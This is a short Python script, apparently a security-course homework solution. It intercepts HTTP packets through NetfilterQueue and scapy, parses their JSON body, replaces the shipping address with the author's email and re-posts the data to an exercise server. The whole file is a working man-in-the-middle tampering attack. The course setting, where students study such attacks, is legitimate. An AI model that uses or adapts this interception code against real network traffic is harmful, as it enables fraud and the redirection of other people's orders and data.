import sys
import json
import requests
from scapy.layers.inet import IP
from netfilterqueue import NetfilterQueue


def print_and_accept(pkt):
    # Get the payload
    raw = pkt.get_payload()
    ip = IP(raw)
    # Only do something if the payload contains TCP and Raw layers
    if ip.haslayer('TCP') and ip.haslayer('Raw'):
        # Extract the TCP layer content
        tcp = ip['TCP']
        if tcp.dport == 80:
            # Extract the http data
            http = ip['Raw'].load.decode()
            # Extract the json data
            data = json.loads(http.split('\n')[-1])
            # Set the destination of the post request
            destination = 'http://com402.epfl.ch/hw1/ex3/shipping'
            # Replace the shipping address with own email
            data['shipping_address'] = 'alexandru.mocanu@epfl.ch'
            print(data)
            # Send the data
            requests.post(destination, json=data)
    pkt.accept()

# Initialize the queue and bind the function to run
nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
